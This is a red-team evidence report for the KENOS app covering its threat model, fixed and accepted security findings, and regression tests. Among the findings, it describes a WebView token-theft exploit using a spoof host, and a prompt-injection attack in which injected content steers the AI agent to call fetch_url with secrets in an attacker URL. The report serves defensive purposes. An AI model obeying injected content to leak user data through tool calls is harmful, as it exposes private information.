---
title: KENOS F5-03 — Security & Privacy Red Team
owner: kenpan
last_verified: 2026-07-21
doc_role: milestone-evidence-report
status: F5_03_PASS_NO_KNOWN_P0_P1
---

# KENOS F5-03 — Security & Privacy Red Team

**Status: `F5_03_PASS_NO_KNOWN_P0_P1`**

No known P0 remains. Both P1s found were fixed with regression tests. Remaining
items are P2 defense-in-depth, tracked as owner gates (they risk breaking the
LAN daily-beta without device verification).

## 1. Threat model (executable focus)

| Asset | Trust boundary | Adversary | Covered by |
| --- | --- | --- | --- |
| Supabase data (tasks/captures/activity) | client→Supabase, native→Supabase | authenticated malicious user | RLS T1–T14, RPC R1–R6 |
| Session tokens | native shell→WebView, WebView→bridge | malicious webpage / redirect | KenosSharedWebAuth spoof test |
| Private context (memory/profile/health) | app→AI model→tool | prompt injection, compromised connector content | egress guard, tool-output injection scan |
| AI tool permissions | model text→tool args | prompt injection | JWT-derived owner, egress guard |
| Device identity | device→challenge/exchange | replay / forgery | timing-safe MAC, fail-closed secret |
| Logs / diagnostics | client→`kenos_app_logs` | accidental PII capture | redaction patterns |

## 2. Findings

### Fixed P1

**P1-A — iOS WebView session-token theft (F5-03.4).**
- Exploit: the `kenosNative` bridge returned the shared Supabase access+refresh
  tokens to page JS gated by **substring** host matching
  (`isAuthRelatedHost` used `host.contains("kenos.space")`), so an
  attacker-registrable host `kenos.space.attacker.com` satisfied the gate. In
  Continuity mode the WebView allows arbitrary origins + link taps, so a
  redirect/link to the spoof host → `getSharedAuthTokens()` → tokens exfiltrated
  → full account takeover. `allowSharedAuth` additionally trusted the
  JS-supplied `params["host"]` when the real URL host was momentarily nil.
- Fix (`KenosSharedWebAuth.swift`, `KenosNativeCapabilityBridge.swift`):
  exact host/suffix matching + full-string private-IPv4 check; `allowSharedAuth`
  now anchors on the REAL committed origin and never on `params["host"]`, failing
  closed when the origin is unverifiable.
- Regression: `KenosDailyBetaConfigTests.testWebAuthRelatedHostSpoofRejected`
  (spoof hosts rejected, genuine LAN/Tailscale/`.local` accepted). KenosMac build PASS.

**P1-B — AI tool-egress data exfiltration (F5-03.7).**
- Exploit (lethal trifecta): private context is injected into the agent prompt,
  the agent ingests untrusted content (`fetch_url`/`web_search`/browser reads),
  and `fetch_url` was an unguarded egress sink — injected content could steer the
  model to `fetch_url("https://attacker/?d=<secret>")`, leaking data in the URL.
- Fix (`toolEgressGuard.core.js` wired into `fetchUrl`): every model-supplied URL
  is evaluated; PII-shaped or high-entropy data packed into an outbound URL to a
  non-allowlisted host is blocked before the request fires. Normal reads to any
  host and search/proxy hosts are unaffected. 6 unit tests.

### Fixed P2

- **Tool-output injection blind spot (F5-03.7).** The injection guard scanned
  only the user's own message. `normalizeToolResult` now wraps injection-flagged
  external-tool output in an `[untrusted_external_content]` boundary
  (`guardExternalToolContent`, 2 tests).
- **Device-auth timing side channel + weak secret fallback (F5-03.3/.6).**
  Challenge MAC compared with `timingSafeEqual` (was `!==`); `hmacSecret()` no
  longer falls back to a public hardcoded literal (fails closed).
- **Log privacy (F5-03.9).** Redaction extended to email / `sb_secret_*` / `sk-*`.

### Accepted / owner-gated (not blocking; risk breaking LAN beta without device test)

- **P2 — Continuity WebView allows arbitrary origins into the bridge**
  (`KenosWebSurfaceView.swift:1491`). Now token-safe (P1-A fix), but a strict
  navigation allowlist is defense-in-depth. Owner gate: add
  `decidePolicyForNavigationAction` origin allowlist + verify Continuity still
  loads on LAN/Tailscale.
- **P2 — `WKAppBoundDomains` absent from `Info.plist`** — the app-bound-domains
  backstop isn't enforced. Owner gate: add the key with the production host set
  after confirming dynamic LAN/`ts.net` origins still load (or scope to prod builds).
- **P2 — web resume accepts any LAN host on a known dev port**
  (`domainResume.core.js`) — same-LAN dev/dogfood only, intentional for phone beta.
- **P2/info — Continuity ingest overwrites `userId`; no `entityId` owner check**
  — cross-user object access is prevented by RLS (proven in F5-02 T3–T14), not by
  the continuity layer. Acceptable given RLS coverage; documented dependency.
- **P2 — `paper_device_snapshot` is anon-executable and returns the full task
  list behind one bearer token, non-constant-time `<>` compare.** Single-owner
  device sync; no cross-user exposure. Owner: rotate/scoping + timing-safe compare.

### Confirmed-safe surfaces (controls verified)

- **Cross-user isolation**: RLS + RPC owner enforcement (F5-02 T1–T14, R1–R6);
  IDOR through convert/complete RPCs blocked (T13/T14).
- **AI ownership**: owner is JWT-derived (`mcp-server/src/auth.js`), no model
  field sets `user_id`; server AI routes are pure Kimi proxies (no server-side
  tool execution, key server-only).
- **Web XSS**: `markdown.js` is escape-first, whitelist-only — http/https links
  only, no `<img>`/`<script>`, KaTeX `trust:false`; artifact iframe sandboxed
  without `allow-same-origin`.
- **Web open-redirect**: resume routes gated by `resolveSpaceOpenHref` origin
  allowlist; planner strips origin to same-origin path.
- **No SQL injection**: kenos RPCs use parameterized jsonb extraction; no
  `EXECUTE`/dynamic SQL. Only 1 anon-executable SECURITY DEFINER fn
  (`paper_device_snapshot`, token-gated).
- **Secrets**: no service-role/private-key values in client bundles or git;
  publishable key only.

## 3. Security regression suite

| Layer | File | Coverage |
| --- | --- | --- |
| DB RLS/authz | `scripts/kenos-cleanroom/rls_security_tests.sql` | T1–T14: anon denial, cross-user CRUD isolation, owner-spoof, actor≠auth.uid, Activity/Capture scoping, IDOR-via-RPC |
| DB RPC integrity | `scripts/kenos-cleanroom/rpc_integrity_tests.sql` | R1–R6: idempotency, atomicity, action-UUID rebind, fail-closed |
| AI exfiltration | `apps/aios/src/lib/toolEgressGuard.core.test.js` | 6: PII/entropy egress blocking, allowlist |
| AI injection | `apps/aios/src/lib/chat-tool-loop.core.test.js` | external-content wrapping |
| Device auth | `apps/planner/server/trustedDeviceAuth.test.mjs` | forged-MAC rejection, step-up |
| iOS host gate | `clients/apple/Apps/Tests/KenosDailyBetaConfigTests.swift` | spoof-host rejection |

Run: `scripts/kenos-cleanroom/replay.sh` (DB) · `npm test -w aios-os` ·
`node apps/planner/server/trustedDeviceAuth.test.mjs` ·
`xcodebuild ... KenosMac test`.

## 4. Action risk / approval (F5-03.8)

Core-loop write RPCs require `requestedRisk='R1'` and reject R2+ (`risk_not_allowed`).
Assistant writes are limited to R1 create/update/complete in the caller's own
account (JWT-bound). No autonomous R2 (external) / R3 (destructive) path is wired
— the ActionExecutor is disabled/fake (`FakeActionExecutor` throws on
`productionWrite`). The Approval record (`kenos_action_approvals`) exists and is
read-only in clients. Enforcement matches the assigned classes.
